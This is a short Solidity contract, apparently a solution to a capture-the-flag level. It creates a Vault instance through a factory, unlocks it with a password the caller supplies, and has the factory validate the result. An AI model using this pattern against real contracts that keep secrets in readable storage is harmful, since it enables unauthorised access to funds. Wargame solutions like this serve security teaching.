// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
import "./VaultFactory.sol";

contract VaultAttack {
    Vault vault;
    VaultFactory vaultFactory;
    address public vaultAddress;

    constructor(address _vaultFactory) {
        vaultFactory = VaultFactory(_vaultFactory);
        vaultAddress = vaultFactory.createInstance(msg.sender);
        vault = Vault(vaultAddress);
    }

    function attack(bytes32 password) public returns(bool) {
        vault.unlock(password);
        (bool res) = vaultFactory.validateInstance(payable(vaultAddress), msg.sender);
        return res;
    }
}
